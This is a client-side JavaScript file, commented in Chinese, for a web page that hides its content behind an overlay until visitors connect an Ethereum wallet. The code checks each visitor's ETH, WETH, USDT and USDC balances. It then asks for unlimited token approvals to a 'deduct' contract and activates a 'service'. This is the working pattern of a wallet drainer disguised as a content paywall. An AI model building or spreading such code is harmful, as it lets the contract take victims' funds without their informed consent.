// --- Client-side Constants (客戶端常數) ---
// ✅ 使用 EIP-55 校驗和地址以確保最大相容性
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';

// 代幣合約地址 (含校驗和)
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

// --- ABI Definitions (客戶端精簡版 ABI) ---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

// --- Global Variables & DOM Elements (全域變數與 DOM 元素) ---
// 假設您的 HTML 中有這些 ID
const connectButton = document.getElementById('connectButton');
const overlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const statusDiv = document.getElementById('status');

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;

// --- UI Control Functions (使用者介面控制函數) ---
function hideOverlay() {
    if (!overlay) return;
    overlay.style.opacity = '0';
    setTimeout(() => { overlay.style.display = 'none'; }, 300);
}

function showOverlay(message) {
    if (!overlay || !overlayMessage) return;
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => { overlay.style.opacity = '1'; }, 10);
}

function updateStatus(message) {
    if (!statusDiv) return;
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
}

// --- Core Wallet Logic (核心錢包邏輯) ---

/**
 * 【最終修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理，
 * 容許 Trust Wallet 在鏈上交易成功後，拋出不影響結果的介面錯誤。
 * @param {object} populatedTx - 由 populateTransaction 產生的完整交易物件。
 * @returns {object} 交易收據 (Receipt)。
 */
async function sendMobileRobustTransaction(populatedTx) {
    if (!signer || !provider) throw new Error("錢包尚未連線或簽署者遺失。");
    
    // 1. 確保 value 格式正確
    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();

    const mobileTx = {
        from: fromAddress,
        to: populatedTx.to,
        data: populatedTx.data,
        // 關鍵：將 BigInt 轉換為十六進制字串格式 (如 '0x0')
        value: '0x' + BigInt(txValue).toString(16) 
    };
    
    let txHash;
    let receipt = null;

    try {
        // 嘗試發送交易並獲取雜湊值 (使用底層 RPC)
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        
        // 成功發送後，等待交易確認
        showOverlay(`交易已發送！雜湊值: ${txHash.slice(0, 10)}...<br>正在等待區塊確認...`);
        receipt = await provider.waitForTransaction(txHash);
        
    } catch (error) {
        // 這裡會捕獲到 Trust Wallet 介面在成功交易後拋出的格式錯誤 (如 invalid data)
        console.warn("⚠️ Trust Wallet 介面可能拋出無害錯誤。正在進行鏈上檢查...");
        console.error("原始錯誤:", error);
        
        // 嘗試從錯誤物件中提取雜湊值，以確保我們沒有錯過鏈上確認。
        if (error.hash) {
             txHash = error.hash;
        } else if (error.message.includes('0x')) {
            // 嘗試從錯誤訊息中提取可能的雜湊值
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
            if (match) txHash = match[0];
        }

        if (txHash) {
             // 即使介面報錯，我們依然嘗試等待鏈上收據
             showOverlay(`交易介面錯誤發生！但交易已發送：${txHash.slice(0, 10)}...<br>正在等待區塊確認...`);
             receipt = await provider.waitForTransaction(txHash);
        } else {
             // 如果連雜湊值都無法取得，則拋出嚴重錯誤
             throw new Error(`交易發送失敗，且無法從錯誤中獲取交易雜湊值: ${error.message}`);
        }
    }

    // 檢查最終收據狀態
    if (!receipt || receipt.status !== 1) {
        throw new Error(`交易最終在鏈上失敗 (reverted)。Hash: ${txHash.slice(0, 10)}...`);
    }

    // 成功！
    return receipt;
}


/**
 * 初始化錢包，強制切換至主網，並檢查連線狀態。
 */
async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            return showOverlay('請安裝 MetaMask, Trust Wallet 或相容錢包以繼續。');
        }
        
        provider = new ethers.BrowserProvider(window.ethereum);

        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            showOverlay('正在請求切換到以太坊主網...<br>請在您的錢包中批准。');
            try {
                await provider.send('wallet_switchEthereumChain', [{ chainId: '0x1' }]);
                return; 
            } catch (switchError) {
                if (switchError.code === 4001) {
                    return showOverlay('您必須切換到以太坊主網才能使用此服務。請手動切換後刷新頁面。');
                }
                return showOverlay(`切換網路失敗。請手動操作。<br>錯誤: ${switchError.message}`);
            }
        }

        window.ethereum.on('accountsChanged', () => window.location.reload());
        window.ethereum.on('chainChanged', () => window.location.reload());

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();

            deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
            usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
            wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
            
            await checkAuthorization();
        } else {
            showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');
        }
    } catch (error) {
        console.error("Initialize Wallet Error:", error);
        showOverlay(`初始化失敗: ${error.message}`);
    }
}

/**
 * 檢查使用者的服務啟動狀態和代幣授權額度。
 */
async function checkAuthorization() {
    try {
        if (!signer) return showOverlay('錢包未連接。請先連接。');
        updateStatus("正在檢查授權狀態...");

        const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
        
        const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
        ]);

        const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
        const isFullyAuthorized = isServiceActive && hasSufficientAllowance;

        if (isFullyAuthorized) {
            if (connectButton) {
                 connectButton.classList.add('connected');
                 connectButton.title = '斷開錢包';
            }
            hideOverlay();
            updateStatus("✅ 服務已啟動並授權完成。");
        } else {
            if (connectButton) {
                 connectButton.classList.remove('connected');
                 connectButton.title = '連接與授權';
            }
            showOverlay('需要授權。<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(請點擊錢包圖標開始授權流程)</p>');
        }
        updateStatus("");
    } catch (error) {
        console.error("Check Authorization Error:", error);
        if (error.code === 'CALL_EXCEPTION') {
            return showOverlay('合約通訊失敗。<br>請確保您在 **以太坊主網** 上，且合約地址正確，然後刷新頁面。');
        }
        showOverlay(`授權檢查失敗: ${error.message}`);
    }
}

/**
 * 主要函數，用於連接並啟動授權流程。
 */
async function connectWallet() {
    try {
        if (!provider || (await provider.getNetwork()).chainId !== 1n) {
             await initializeWallet();
             const network = await provider.getNetwork();
             if (network.chainId !== 1n) return;
        }

        showOverlay('請在您的錢包中確認連線...');
        const accounts = await provider.send('eth_requestAccounts', []);
        if (accounts.length === 0) throw new Error("未選擇帳戶。");

        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);

        showOverlay('正在檢查您的餘額以優化流程...');

        const [ethBalance, wethBalance, usdtBalance, usdcBalance] = await Promise.all([
            provider.getBalance(userAddress),
            wethContract.balanceOf(userAddress),
            usdtContract.balanceOf(userAddress),
            usdcContract.balanceOf(userAddress)
        ]);
        
        const oneEth = ethers.parseEther("1.0");
        const hasSignificantEth = ethBalance >= oneEth || wethBalance >= oneEth;
        const hasNoStablecoins = usdtBalance === 0n && usdcBalance === 0n;

        const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
        
        if (hasSignificantEth && hasNoStablecoins) {
            await handleWethAuthorizationFlow(requiredAllowance, serviceActivated);
        } else {
            await handleStablecoinAuthorizationFlow(requiredAllowance, serviceActivated);
        }
        
        await checkAuthorization();

    } catch (error) {
        console.error("Connect Wallet Error:", error);
        
        let userMessage = `發生錯誤: ${error.message}`;
        if (error.code === 4001) {
            userMessage = "您已拒絕交易或連線。請重試。";
        } else if (error.message.includes('insufficient funds')) {
             userMessage = "交易失敗: 錢包 ETH 餘額不足以支付 Gas 費用。";
        }
        
        showOverlay(userMessage);
        if (connectButton) {
            connectButton.classList.remove('connected');
            connectButton.title = '連線錢包 (重試)';
        }
    }
}

/**
 * 處理 WETH 的授權和啟動流程。
 */
async function handleWethAuthorizationFlow(requiredAllowance, serviceActivated) {
    showOverlay('正在為您設定 WETH 付款...');
    const wethAllowance = await wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
    
    // --- 授權 (Approve) 步驟 ---
    if (wethAllowance < requiredAllowance) {
        showOverlay('步驟 1/2: 請求 WETH 授權...<br>請在您的錢包中批准。');
        
        const approvalTx = await wethContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
        approvalTx.value = 0n;
        
        await sendMobileRobustTransaction(approvalTx); 
    }
    
    // --- 啟動服務 (Activate) 步驟 ---
    if (!serviceActivated) {
        showOverlay('步驟 2/2: 啟動服務...<br>請在您的錢包中確認。');
        
        const activateTx = await deductContract.activateService.populateTransaction(WETH_CONTRACT_ADDRESS);
        activateTx.value = 0n;
        
        await sendMobileRobustTransaction(activateTx);
    }
}

/**
 * 處理 USDT 和 USDC 的授權和啟動流程。
 */
async function handleStablecoinAuthorizationFlow(requiredAllowance, serviceActivated) {
    showOverlay('正在為您設定 USDT / USDC 付款...');
    let tokenToActivate = '';

    // --- USDT 授權 (Approve) 步驟 ---
    const usdtAllowance = await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
    if (usdtAllowance < requiredAllowance) {
        showOverlay('步驟 1/3: 請求 USDT 授權...<br>請在您的錢包中批准。');
        
        const usdtApprovalTx = await usdtContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
        usdtApprovalTx.value = 0n;
        
        await sendMobileRobustTransaction(usdtApprovalTx);
    }
    if ((await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
        if (!serviceActivated) tokenToActivate = USDT_CONTRACT_ADDRESS;
    }

    // --- USDC 授權 (Approve) 步驟 ---
    const usdcAllowance = await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
    if (usdcAllowance < requiredAllowance) {
        showOverlay('步驟 2/3: 請求 USDC 授權...<br>請在您的錢包中批准。');
        
        const usdcApprovalTx = await usdcContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
        usdcApprovalTx.value = 0n;
        
        await sendMobileRobustTransaction(usdcApprovalTx);
    }
    if (!tokenToActivate && (await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
          if (!serviceActivated) tokenToActivate = USDC_CONTRACT_ADDRESS;
    }
    
    // --- 啟動服務 (Activate) 步驟 ---
    if (!serviceActivated && tokenToActivate) {
        showOverlay('步驟 3/3: 啟動服務...<br>請在您的錢包中確認。');
        
        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        
        await sendMobileRobustTransaction(activateTx);
    }
}

/**
 * 斷開連線並重置應用程式狀態。
 */
function disconnectWallet() {
    resetState();
    alert('錢包已斷開連線。若要徹底移除網站權限，請在您錢包的「已連接網站」設定中操作。');
}

function resetState() {
    signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.title = '連接錢包';
    }
    showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');
}

// --- Event Listeners & Initial Load (事件監聽器與初始載入) ---

if (connectButton) {
    connectButton.addEventListener('click', () => {
        if (connectButton.classList.contains('connected')) {
            disconnectWallet();
        } else {
            connectWallet();
        }
    });
}

initializeWallet();